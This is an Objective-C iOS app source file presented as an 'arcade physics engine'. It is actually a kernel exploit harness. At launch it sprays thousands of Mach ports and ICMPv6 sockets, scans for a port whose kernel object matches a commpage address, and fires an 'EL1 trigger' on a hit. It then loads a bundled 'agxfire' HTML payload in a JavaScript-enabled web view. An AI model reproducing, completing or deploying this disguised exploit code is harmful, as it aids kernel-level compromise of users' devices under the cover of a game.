/* arcade physics engine */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <mach/task.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <asl.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#define NUM_PORTS        5000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
#define MAX_FIRES        50
#define FIRE_INTERVAL_MS 500

static mach_port_t  g_ports[NUM_PORTS];
static int          g_port_count  = 0;
static int          g_socks[NUM_SOCKETS];
static int          g_sock_count  = 0;
static _Atomic int  g_found       = 0;
static FILE        *g_logfile     = NULL;

static void file_log(const char *msg) {
    if (!g_logfile) return;
    fprintf(g_logfile, "%s\n", msg);
    fflush(g_logfile);
}

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%{public}s", buf);
    NSLog(@"[app] %{public}s", buf);
    file_log(buf);
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    ev("SPRAY socks=%d ports=%d target=0x%016llx",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
}

static void fire_el1_trigger(mach_port_t port, int idx, natural_t kotype,
                             mach_vm_address_t kobject) {
    ev("EL1_TRIGGER_SENT port=%d kotype=%u kobject=0x%016llx sending task_info",
       idx, kotype, (unsigned long long)kobject);
    task_basic_info_data_t info;
    mach_msg_type_number_t count = TASK_BASIC_INFO_COUNT;
    kern_return_t kr = task_info((task_t)port, TASK_BASIC_INFO,
                                 (task_info_t)&info, &count);
    ev("EL1_TRIGGER_RETURNED_UNEXPECTED kr=%d count=%u", kr, count);
}

static void scan_background(void) {
    if (g_found) return;
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr != KERN_SUCCESS) continue;

        if (kobject == COMMPAGE_TARGET) {
            if (kotype == 2) {
                g_found = 1;
                ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx -> EL1 trigger",
                   i, kotype, (unsigned long long)kobject);
                fire_el1_trigger(g_ports[i], i, kotype, kobject);
            } else {
                ev("KOBJECT_MATCH_WRONG_KOTYPE port=%d kotype=%u kobject=0x%016llx",
                   i, kotype, (unsigned long long)kobject);
            }
        } else if (kotype == 2) {
            ev("IKOT_TASK_WRONG_KOBJECT port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        } else if (kotype > 0 && kotype <= 100) {
            ev("KOTYPE_ANOMALY_LOW port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
    for (int i = 0; i < g_sock_count; i++) {
        if (g_found) break;
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                ev("ICMP_CORRUPTION sock=%d byte[%d]=0x%02X", i, j, out[j]);
                break;
            }
        }
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate, WKScriptMessageHandler>
@property (strong) UIWindow   *window;
@property (strong) WKWebView  *webView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *docPath = [paths firstObject];
    NSString *logPath = [docPath stringByAppendingPathComponent:@"scan_log.txt"];
    g_logfile = fopen([logPath UTF8String], "w");

    ev("APP_LAUNCH ArcadePhysics v1 v1.0");
    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20,80,300,60)];
    lbl.text = @"ArcadePhysics v1 — el1 trigger";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    spray();

    [NSTimer scheduledTimerWithTimeInterval:0.10
                                     target:self
                                   selector:@selector(scanTick:)
                                   userInfo:nil repeats:YES];

    [NSTimer scheduledTimerWithTimeInterval:3.0
                                     target:self
                                   selector:@selector(fireWebGL:)
                                   userInfo:nil repeats:NO];
    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        scan_background();
    });
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
}

- (void)fireWebGL:(NSTimer *)t {
    ev("FIRE loading agxfire_v17.html in WKWebView");
    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    cfg.allowsInlineMediaPlayback = YES;
    WKPreferences *prefs = [WKPreferences new];
    prefs.javaScriptEnabled = YES;
    cfg.preferences = prefs;
    WKUserContentController *ucc = [WKUserContentController new];
    [ucc addScriptMessageHandler:self name:@"nexus"];
    cfg.userContentController = ucc;

    self.webView = [[WKWebView alloc] initWithFrame:self.window.bounds configuration:cfg];
    [self.window.rootViewController.view addSubview:self.webView];

    NSURL *url = [[NSBundle mainBundle] URLForResource:@"agxfire_v17" withExtension:@"html"];
    if (url) {
        [self.webView loadFileURL:url
          allowingReadAccessToURL:url.URLByDeletingLastPathComponent];
    } else {
        ev("ERROR agxfire_v17.html missing from bundle");
    }
}

- (void)userContentController:(WKUserContentController *)ucc
      didReceiveScriptMessage:(WKScriptMessage *)msg {
    ev("JS_MSG %s", [[msg.body description] UTF8String]);
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}

@end
